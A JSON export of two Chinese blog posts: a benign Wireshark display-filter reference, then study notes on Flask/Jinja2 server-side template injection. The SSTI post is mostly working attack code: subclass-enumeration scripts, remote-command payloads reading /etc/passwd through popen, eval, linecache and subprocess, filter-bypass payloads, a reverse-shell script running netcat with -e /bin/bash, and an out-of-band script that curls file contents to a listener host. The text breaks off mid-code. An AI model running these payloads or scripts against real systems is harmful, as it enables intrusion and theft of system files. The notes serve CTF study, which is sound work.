[{"id":"063a4b4785d156e93ebf4fc9f6bcc38f","title":"WireShark过滤器语法和参考（中文版）说明手册","content":"Wireshark过滤器语法和参考概述Wireshark和TShark共享一个强大的过滤引擎，可以帮助去除数据包跟踪中的噪音，只显示您感兴趣的数据包。如果一个数据包满足您过滤器中的要求，它将显示在数据包列表中。显示过滤器可以让您比较协议中的字段与特定值，比较字段与字段，以及检查指定字段或协议的存在。过滤器还被其他功能使用，例如统计信息生成和数据包列表着色（后者仅适用于Wireshark）。本手册描述了它们的语法。过滤器字段的详细参考可以在Wireshark中找到，并在显示过滤器参考中找到。\n过滤器语法检查字段或协议是否存在最简单的过滤器允许您检查协议或字段的存在。如果您想查看包含IP协议的所有数据包，则过滤器将是”ip”（不带引号）。要查看包含Token-Ring RIF字段的所有数据包，请使用”tr.rif”。每当协议或字段出现在过滤器的函数参数中时，该协议或字段的exists运算符会隐式出现。\n值和运算符每个字段都有一个值，并且该值可以与可比较的值（可以是文字、其他字段或函数结果）进行操作。字段的值不一定是出现在Wireshark显示或TShark输出中的值。例如，协议在语义上等同于它所涵盖的字节序列，而不是协议树中显示的文本。\n比较运算符比较运算符可以通过类似于英语的缩写或类似于C语言的符号来表示：\n\neq, &#x3D;&#x3D;：等于\nne, !&#x3D;：不等于\ngt, &gt;：大于\nlt, &lt;：小于\nge, &gt;&#x3D;：大于等于\nle, &lt;&#x3D;：小于等于\n\n不同类型的值按照通常的方式进行排序（例如，字符串按字典顺序排序，整数按算术排序）。一个字段在给定的帧中可能出现多次。在这种情况下，等式可以是严格的（所有字段都必须满足条件）或非严格的（任何字段都必须满足条件）。不等式是等式的逻辑否定。下表列出了所有等式运算符，它们的别名和含义：\n\neq, any_eq, &#x3D;&#x3D;：任何字段都必须相等\nne, all_ne, !&#x3D;：所有字段都必须不相等\nall_eq, &#x3D;&#x3D;&#x3D;：所有字段都必须相等\nany_ne, !&#x3D;&#x3D;：任何字段都必须不相等\n\n可以使用”any”或”all”修饰符与任何比较运算符配合使用，以使测试匹配任何或所有字段：\n\nall tcp.port &gt; 1024\nany ip.addr !&#x3D; 1.1.1.1\n\n“any”和”all”修饰符优先于比较运算符，如”&#x3D;&#x3D;&#x3D;”和”any_eq”。\n搜索和匹配运算符还存在其他仅用英语而不是类C语法表示的运算符：\n\ncontains：协议、字段或片段是否包含某个值\nmatches, ~：字符串是否与给定的不区分大小写的Perl兼容正则表达式匹配\n\n“contains”运算符允许过滤器搜索一个由字符串表示的字符序列或由字节数组表示的字节。”contains”运算符左边的类型必须与右边经过隐式或显式转换后的类型可比较。例如，要在捕获中搜索给定的HTTP URL，可以使用以下过滤器：\n\nhttp contains “https://www.wireshark.org“\n\n“contains”运算符不能用于原子字段，例如数字或IP地址。\n“matches”或”~”运算符允许过滤器应用于指定的Perl兼容正则表达式（PCRE2）。正则表达式必须是双引号括起来的字符串。”matches”运算符的左边必须是一个字符串，它可以是一个非字符串字段，隐式或显式转换为字符串。匹配默认不区分大小写。\n例如，要搜索给定的WAP WSP User-Agent，可以编写：\n\nwsp.header.user_agent matches “cldc”这将匹配”cldc”、”CLDC”、”cLdC”或其他大小写字母的组合。\n\n您可以使用以下方法强制区分大小写：\n\nwsp.header.user_agent matches “(?-i)cldc”\n\n这是PCRE2的”(?option)”构造的示例。”(?-i)”执行区分大小写的模式匹配，但还可以指定其他选项。有关更多信息，请参阅pcre2pattern(3)手册。\n函数过滤器语言具有以下函数：\n\nupper(string-field)：将字符串字段转换为大写\nlower(string-field)：将字符串字段转换为小写\nlen(field)：返回字符串或字节字段的字节长度\ncount(field)：返回帧中字段出现的次数\nstring(field)：将非字符串字段转换为字符串\nmax(f1,…,fn)：返回最大值\nmin(f1,…,fn)：返回最小值\nabs(field)：返回数值字段的绝对值upper()和lower()对于执行不区分大小写的字符串比较很有用。例如：\nupper(ncp.nds_stream_name) contains “MACRO”\nlower(mount.dump.hostname) &#x3D;&#x3D; “angel”string()将字段值转换为字符串，适用于”matches”或”contains”等运算符。整数字段将转换为十进制表示。它可以与IP&#x2F;Ethernet地址（以及其他一些字段）一起使用，但不能与字符串或字节字段一起使用。例如：\nstring(frame.number) matches “[13579]$”这将给出所有奇数数据包。max()和min()接受任意数量的参数，并分别返回一个值，即最大值&#x2F;最小值。参数必须具有相同的类型。\n\n协议字段类型每个协议字段都有类型。这些类型包括:\n\nASN.1 对象标识符,可以是普通的或者相对的\nAX.25 地址  \n布尔值\n字节序列\n字符字符串\n1 字节字符\n日期和时间\n以太网或其他 MAC 地址\nEUI64 地址\n光纤通道 WWN\n浮点数,单精度或双精度\n帧号\n全局唯一标识符\nIEEE-11073 浮点数,16 位或 32 位\nIPv4 地址\nIPv6 地址  \nIPX 网络号\n标签\nOSI 系统标识符\n协议\n有符号整数,1、2、3、4 或 8 字节\n时间偏移量\n无符号整数,1、2、3、4 或 8 字节\nVINES 地址\n\n整数可以用十进制、八进制、十六进制或二进制表示,或者用 C 样式的字符常量表示。以下 7 个显示过滤器是等价的:\nframe.len &gt; 10frame.len &gt; 012frame.len &gt; 0xaframe.len &gt; 0b1010frame.len &gt; &#39;\\n&#39;frame.len &gt; &#39;\\x0a&#39;frame.len &gt; &#39;\\012&#39;\n布尔值只能是 true 或 false。在显示过滤器表达式中测试布尔字段的值时,true 可以用单词 “True” 或 “TRUE”(不带引号)表示,或者任何非零数。False 可以用 “False” 或 “FALSE” 表示,或者数值 0。例如,令牌环数据包的源路由字段是布尔值。要找到任何源路由数据包,显示过滤器可以是:tr.sr == 1tr.sr == Truetr.sr == TRUE\n找不源路由的数据包可以是:tr.sr == 0tr.sr == Falsetr.sr == FALSE\n以太网地址和字节数组用十六进制数字表示。十六进制数字之间可以用冒号、句点或破折号分隔:eth.dst eq ff:ff:ff:ff:ff:ffaim.data == 0.1.0.dfddi.src == aa-aa-aa-aa-aa-aaecho.data == 7a\nIPv4 地址可以用点分十进制表示法表示,或者用主机名表示:ip.src == 192.168.1.1ip.dst eq www.mit.edu\nIPv4 地址可以用同样的逻辑关系来比较,如 eq,ne,gt,ge,lt,le。IPv4 地址以主机顺序存储,所以在使用 IPv4 地址时不需要考虑字节顺序问题。\n可以使用无类域间路由(CIDR)表示法来测试 IPv4 地址是否在某个子网中。例如,这个显示过滤器将找到所有在 129.111 网络中的数据包:ip.addr == 129.111.0.0/16\n请记住,斜杠后的数字代表用于表示网络的比特数。CIDR 表示法也可以与主机名一起使用,例如找到与 “sneezy” 在同一网络上的 IP 地址(需要 “sneezy” 能解析成 IP 地址才能使过滤器有效):ip.addr eq sneezy/24\nCIDR 表示法只能用于 IP 地址或主机名,不能在变量名中使用,所以 “ip.src&#x2F;24 &#x3D;&#x3D; ip.dst&#x2F;24” 这样的显示过滤器是无效的(暂时如此)。\n以下表列出了字符串和字符常量中支持的所有转义序列:&#39;          单引号&quot;          双引号\\          反斜杠\\a          响铃\\b          退格\\f          换页\\n          换行\\r          回车\\t          水平制表符\\v          垂直制表符\\NNN        任意八进制值\\xNN        任意十六进制值\\uNNNN      Unicode 代码点 U+NNNN\\UNNNNNNNN  Unicode 代码点 U+NNNNNNNN\n日期和时间值可以用 ISO 8601 格式表示,也可以用传统的月-年-时间格式:“2020-07-04T12:34:56”“Sep 26, 2004 23:18:04.954975”\nISO 8601 格式中的 ‘T’ 分隔符可以省略。ISO 8601 支持时区标识符,如 UTC 或相对于 UTC 的偏移量。传统格式可以在结尾追加 “UTC” 指定按协调世界时计算。否则,日期和时间值将被解释为本地时间。\n切片运算符如果字段是文本字符串或字节数组，您可以对字段进行切片操作。例如，您可以通过以下方式过滤以太网地址的厂商部分（前三个字节）：eth.src[0:3] == 00:00:83\n另一个例子是：http.content_type[0:4] == &quot;text&quot;\n您还可以在协议名称上使用切片操作符。”frame”协议可能非常有用，它包含了Wireshark或TShark捕获的所有数据。token[0:5] ne 0.0.0.1.1llc[0] eq aaframe[100-199] contains &quot;wireshark&quot;\n以下是切片的语法规则：\n\n[i:j]    i &#x3D; 起始偏移量，j &#x3D; 长度\n[i-j]    i &#x3D; 起始偏移量，j &#x3D; 结束偏移量，包含边界。\n[i]      i &#x3D; 起始偏移量，长度 &#x3D; 1\n[:j]     起始偏移量 &#x3D; 0，长度 &#x3D; j\n[i:]     起始偏移量 &#x3D; i，结束偏移量 &#x3D; 字段末尾\n\n偏移量可以是负数，表示相对于字段末尾的偏移量。字段的最后一个字节的偏移量为-1，倒数第二个字节的偏移量为-2，依此类推。以下是如何检查帧的最后四个字节：frame[-4:4] == 0.1.2.3或frame[-4:] == 0.1.2.3\n切片始终可以与字符串或字节序列进行比较。\n切片可以组合使用，可以使用逗号运算符将它们连接起来：ftp[1,3-5,9:] == 01:03:04:05:09:0a:0b\n这将连接偏移量1、偏移量3-5和偏移量9到ftp数据的末尾。\n层操作符可以使用层操作符（#）将字段限定为协议栈中的特定层，后面跟着一个十进制数：ip.addr#2 == 192.168.30.40\n仅匹配数据包中的内部（第二个）层。层使用简单的堆叠语义，协议层按照从1开始的顺序递增计数。例如，在包含两个IPv4头的数据包中，外部（第一个）源地址可以与 “ip.src#1” 匹配，内部（第二个）源地址可以与 “ip.src#2” 匹配。\n对于更复杂的范围，与切片一样，使用相同的语法是有效的：tcp.port#[2-4]表示第2、3或4个层。哈希符号（#）必须用于区分层范围和切片。\n成员关系操作符可以使用成员关系操作符来检查字段是否匹配一组值。例如，您可以使用以下过滤器找到常见的HTTP&#x2F;HTTPS端口的流量：tcp.port in &#123;80,443,8080&#125;\n与更冗长的写法相比：tcp.port == 80 or tcp.port == 443 or tcp.port == 8080\n要查找使用HEAD或GET方法的HTTP请求：http.request.method in &#123;&quot;HEAD&quot;, &quot;GET&quot;&#125;\n值集合也可以包含范围：tcp.port in &#123;443, 4430..4434&#125;ip.addr in &#123;10.0.0.5 .. 10.0.0.9, 192.168.1.1..192.168.1.9&#125;frame.time_delta in &#123;10 .. 10.5&#125;\n隐式类型转换字节序列字段（包括协议字段）在与（双引号）文本字符串或原始字符串进行比较时，会隐式转换为字符串。\n因此，例如，以下过滤器是等价的：tcp.payload contains &quot;GET&quot;tcp.payload contains 47.45.54\n如上所述，切片也可以以两种方式进行比较：frame[60:2] gt 50.51frame[60:2] gt &quot;PQ&quot;\n反之则不成立，类似字符串的字段不会隐式转换为字节数组。（某些操作符允许将类似字符串的字段与未引用的字面量进行比较，然后将其视为字符串；这是不推荐的，并且特定的”matches”操作符不允许。为了清晰起见，字面字符串应该使用双引号括起来。）\n十六进制整数如果小于或等于0xff（即适合一个字节），则可以隐式转换为字节字符串。对于大于一个字节的十六进制整数，这是不允许的，因为需要指定多字节整数的字节顺序。此外，对于十进制或八进制数也不允许，因为它们可能与字节字符串字面量中的十六进制数混淆。然而，单字节的十六进制整数可以很方便：frame[4] == 0xffframe[1:4] contains 0x02\n位运算符还可以使用位运算来定义测试。目前支持以下位运算符：bitwise_and, &amp;    位与操作\n位与操作允许掩码位和测试是否设置了一个或多个位。位与操作适用于整数协议字段和切片。\n要测试TCP SYN数据包，可以编写：tcp.flags &amp; 0x02\n该表达式将匹配所有包含已设置0x02位（即SYN位）的”tcp.flags”字段的包。\n要匹配本地管理的单播以太网地址，可以使用：eth.addr[0] &amp; 0x0f == 2\n使用切片时，位掩码必须指定为字节字符串，并且其字节数量必须与切片本身相同，例如：ip[42:2] &amp; 40:ff\n算术运算符算术表达式支持常见的运算符：+   加法-   减法*   乘法/   除法%   取模（整数余数）\n例如，可以使用以下表达式过滤目标端口大于或等于源端口加1的UDP数据包：udp.dstport &gt;= udp.srcport + 1\n可以使用花括号（大括号）来分组算术表达式（括号不起作用）：tcp.dstport &gt;= 4 * &#123;tcp.srcport + 3&#125;\n不要将此使用花括号的用法与成员关系混淆。\n过滤表达式中的运算符注意事项是减法运算符必须在前面加一个空格字符，因此”A-B”必须写成”A -B”或”A - B”。\n协议字段引用形如$&#123;some.proto.field&#125;的带有sigil的变量称为字段引用。字段引用是从GUI中当前选定的帧中读取的字段值。这对于构建动态过滤器非常有用，例如，显示自上次选择帧以来的过去五分钟内的帧：frame.time_relative &gt;= $&#123;frame.time_relative&#125; - 300\n字段引用与宏具有类似的表示法，但它们是过滤语言中的不同语法元素。\n逻辑表达式可以使用逻辑表达式组合测试。这些表达式可以按照类似C语法的方式或使用类似英语的缩写方式表示。下表列出了逻辑运算符的优先级，从高到低：\n\nnot, !    逻辑非   (从右往左结合)\nand, &amp;&amp;   逻辑与   (从左往右结合)\nor,  ||   逻辑或    (从左往右结合)\n\n表达式的计算总是从左到右进行。还可以使用括号对表达式进行分组。例如，表达式 “A and B or not C or D and not E or F” 的读法是：(A and B) or (not C) or (D and (not E)) or F\n通常最好使用括号明确分组。以下是一些有效的显示过滤器表达式：tcp.port == 80 and ip.src == 192.168.2.1not llchttp and frame[100-199] contains &quot;wireshark&quot;(ipx.src.net == 0xbad &amp;&amp; ipx.src.node == 0.0.0.0.0.1) || ip\n请记住，每当协议或字段名称出现在表达式中时，”exists”运算符会隐式调用。”exists”运算符具有最高优先级。这意味着第一个过滤器表达式应该被理解为”显示tcp.port存在且等于80，ip.src存在且等于192.168.2.1的数据包”。第二个过滤器表达式的意思是”显示不存在llc的数据包”，也就是说”llc不存在”，因此将匹配不包含llc协议的所有数据包。第三个过滤器表达式包括了帧中偏移量199存在的约束，也就是帧的长度至少为200。\n每个比较都对任何字段值进行了隐式的存在性测试。在使用显示过滤器从数据包跟踪中删除噪声时，需要注意。例如，如果要过滤所有发送到地址224.1.2.3的IP组播数据包，那么使用：ip.dst ne 224.1.2.3可能过于严格。这与以下写法相同：ip.dst and ip.dst ne 224.1.2.3\n该过滤器只选择具有”ip.dst”字段的帧。任何其他帧，包括所有非IP数据包，都不会被显示。要同时显示非IP数据包，可以使用以下两个表达式之一：not ip.dst or ip.dst ne 224.1.2.3not ip.dst eq 224.1.2.3\n第一个过滤器使用”not ip.dst”来包含所有非IP数据包，然后使用”ip.dst ne 224.1.2.3”来过滤掉不需要的IP数据包。第二个过滤器也否定了隐式的存在性测试，因此是写第一个过滤器的简洁方式。\n","slug":"工具_wireshark","date":"2023-07-11T03:20:34.000Z","categories_index":"工具","tags_index":"渗透工具,wireshark","author_index":"南瓜の无名"},{"id":"3137c2b6b2ca0e39e8c62639d966b498","title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","content":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统\n漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互\nflask是基于python开发的一种web框架，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file等等之类的函数。\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123; &#123;str&#125; &#125;&lt;&#x2F;body&gt;        \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;\n    #str是被&#123; &#123;&#125; &#125;包括起来的，会被预先渲染转义，然后才会输出，不会被渲染执行；\n    return render_template_string(html_str,str&#x3D;str)\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;不会执行\n\nfrom importlib.resources import contents\nimport time\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)       #&#123;&#125;里面可以定义任何参数\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123;0&#125;&lt;&#x2F;body&gt;    \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;.format(str)     #str值通过format()函数填充到body中间\n    return render_template_string(html_str)\n    #return render_template_string会把&#123;&#125;内的字符串当成代码指令\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;会被当成指令执行 \n\n可以利用魔术方法去验证模板注入\n127.0.0.1:8888&#x2F;?a&#x3D;&#123; &#123;&quot;.__class__.__mro__&#125; &#125;\n\n服务器端模板注入实际上也是一种注入漏洞。\n判断模板类型$&#123;7*7&#125;成功：\na&#123;*comment*&#125;b           输出ab -&gt; Smarty\n$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;       输出azb -&gt; Mako or ???\n\n$&#123;7*7&#125;失败：\n&#123; &#123;7*7&#125; &#125; and &#123; &#123;7*&#39;7&#125;&#39;&#125;   输出49 -&gt; Jinja2 or Twig or ???\n\nssti常用注入模板1.文件读取2.内建函数eval执行命令3.os模块执行命令4.importlib类执行命令5.linecache函数执行命令6.subprocess.Popen类执行命令\n1.文件读取#查找子类 _frozen_importlib_external.FileLoader\n&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;\n#FileLoader的利用\n&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;&#x2F;etc&#x2F;passed&quot;)&#125; &#125;\n#读取配置文件下的FLAG\n&#123; &#123;config&#125; &#125;\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n\n~python脚本编写(POST提交”name”的值，通过for循环查找所需字符串)\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500)\n    data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    #data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__mro__[1].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib_external.FileLoader&#39; in response.text:\n                print(i)\n    except:\n        pass \n\n2.内建函数eval执行命令内建函数：python在执行脚本时自动加载的模块\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500):\n    data&#x3D;&#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#39;__builtins__&#39;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;eval&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat .&#x2F;etc&#x2F;passwd&quot;).read()&#39;)&#125; &#125;\n\n__builtins__提供对python的所有”内置“标识符的直接访问\neval()计算字符串表达式的值\n__import__加载os模块\npopen()执行一个shell以运行命令来开启一个进程，执行cat &#x2F;etc&#x2F;passwd\n(system没有回显)\n\n3.os模块执行命令~~在其他函数中直接调用os模块\n#通过config，调用os\n&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125; &#125;\n\n#通过url_for，调用os\n&#123; &#123;url_for.__globals__.os.popen(&#39;whoami&#39;).read()&#125; &#125;\n\n~~在已经加载好os模块的子类里直接调用os模块\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#39;os&#39;].popen(&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n&quot;&quot;&quot;\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__bases__[0] 返回 str 基类对象。\nstr.__bases__[0].__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[199] 表示选择该列表中的第 200 个子类，因为在 Python 中，许多内置或库（如 os、sys 等）都是基于类实现的，而拥有相同父类的类按照继承顺序排序在该列表中。\n.__init__ 返回所选子类的初始化方法。\n.__globals__[&#39;os&#39;] 返回一个包含 os 模块的全局命名空间字典。\n.popen(&quot;ls -l &#x2F;opt&quot;) 在该全局命名空间中调用 popen() 方法，并执行一个列出位于 &#x2F;opt 目录下的所有文件的命令。\n.read() 读取命令所输出的数据并返回给模板。\n&quot;&quot;&quot;\n\n其他一些payload的举例\n&#123; &#123;self.__dict__._TemplateReference__context.keys()&#125; &#125;\n&#123; &#123;lipsum.__globals__.os.popen(&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n\n__base__和__bases__[ ]的区别\n__base__ 属性只能获取单一的父类，而 __bases__[] 属性可以获取到所有的直接父类。\n\n4.importlib类执行命令可以加载第三方库，使用load_module加载ospython脚本查找_frozen_importlib.BuiltinImporter\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib.BuiltinImporter&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n\n5.linecache函数执行命令linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。python脚本查找linecache\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;linecache&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n\n6.subprocess.Popen类执行命令从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。python脚本查找subprocess.Popen:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;subprocess.Popen&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125; &#125;\n&quot;&quot;&quot;\n[] 创建一个空列表。\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__base__ 返回 str 基类对象。\nstr.__base__.__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[200] 表示选择该列表中的第 201 个子类，因为在 Python 中，许多内置或到处的库（如 os、sys 等）都是基于类实现的，并且继承关系可能会随着版本更新而变化。\n调用所选类的初始化方法，并传递给它要执行的系统命令和参数。请注意，这里将参数传递给 shell&#x3D;True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。\ncommunicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。\ncommunicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。\nstrip() 去除输出的最前面之后的空白字符。\n&quot;&quot;&quot;\n\n总结\n绕过过滤1.绕过过滤双大括号{ % % }是属于flask的控制语句，且以{ % end… % }结尾，可以通过在控制语句定义变量或者写循环，判断。示例app.py:\nfrom flask import Flask,rendre_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef show1():\n    girls &#x3D; [&#39;小红&#39;,&#39;小蓝&#39;，&#39;小粉&#39;,&#39;小黄&#39;,&#39;小绿&#39;]\n    return render_template(&#39;index.html&#39;,girls&#x3D;girls)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n示例index.html:\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Document&lt;&#x2F;title&gt;\n    &lt;style&gt;\n            .a&#123;\n                color:red;\n                font_weight:bold;\n            &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n    &#123; % for girl in girls % &#125;\n        &#123; % if girl|length &gt;&#x3D;3 % &#125;\n            &lt;li class&#x3D;&quot;a&quot;&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % else % &#125;\n            &lt;li&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % endif % &#125;\n    &#123; % endfor % &#125;\n&lt;&#x2F;ul&gt;\n&#123; % set name&#x3D;&#39;a&#39; % &#125;\n&#123; &#123;name&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n解题思路\n#判断&#123; &#123;&#125; &#125;被过滤\n#尝试&#123; % % &#125;\n&#123; % if 2&gt;1 % &#125;name&#123; % endif % &#125;\n&#123; % if &#39;&#39;.__class__ % &#125;name&#123; % endif % &#125;\n#有回显name说明&#39;&#39;.__class__有内容\n&#123; % if &quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;\n#如果有回显name则说明命令正常执行\n构造脚本查询可使用“popen”的子类编号\nimport requests\nurl &#x3D; input(&quot; 请输入url链接 &quot;)\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; % if &quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &quot;name&quot; in response.text:\n                print(i,&quot;--&gt;&quot;,data)  \n                break\n    except:\n        pass\n\npayload：\n&#123; % print(&quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read()) % &#125;\n\n2.无回显ssti模板注入~ ssti盲注思路：\n(1)反弹shell\n通过rce反弹一个shell出来绕过\n(2)带外注入\n通过requestbin或dnslog的方法将信息传到外界\n(3)纯盲注\n\n反弹shell（没有回显，直接使用脚本批量执行希望执行的命令）\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 监听主机 端口 -e &#x2F;bin&#x2F;bash&quot;).read()&#125; &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#监听主机收到反弹shell进入对方命令行界面\n\n带外注入此处使用wget方法来带外想要知道的内容，也可以使用dnslog或者nc。\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;curl http:&#x2F;&#x2F;监听主机ip&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;).read()&#125; &#125;&#39;&#125;            \n        #反引号命令执行\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#同时kali开启一个python http监听  #python3 -m http.server 80\n#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）\n\n纯盲注\n3.getitem绕过中括号过滤__getitem__()是python的一个魔术方法，对字典使用时，传入字符串，返回字典相应键所对应的值；对列表使用时，传入整数，返回列表对应索引的值；\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def 